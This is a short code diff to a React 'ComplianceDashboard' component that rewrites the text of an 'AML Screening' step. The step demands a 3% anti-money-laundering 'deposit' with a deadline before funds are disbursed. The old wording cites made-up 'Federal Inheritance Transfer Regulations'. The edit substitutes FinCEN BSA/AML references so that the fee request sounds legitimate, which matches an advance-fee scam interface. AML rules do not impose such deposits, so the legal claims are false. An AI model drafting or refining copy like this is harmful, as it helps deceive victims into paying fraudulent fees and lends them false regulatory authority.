@@ -140,7 +140,7 @@ const ComplianceDashboard = () => {
     },
     { 
       title: "AML Screening", 
-      description: `Under Federal Inheritance Transfer Regulations (31 CFR § 103.22), a 3% Anti-Money Laundering compliance deposit of $${amlFeeAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} is required prior to fund disbursement.`,
+      description: `Per FinCEN BSA/AML compliance requirements (31 CFR Chapter X), a 3% Anti-Money Laundering verification deposit of $${amlFeeAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} is required to complete enhanced due diligence prior to fund disbursement.`,
       status: "pending",
       isPending: true,
       deadline: amlDeadline,
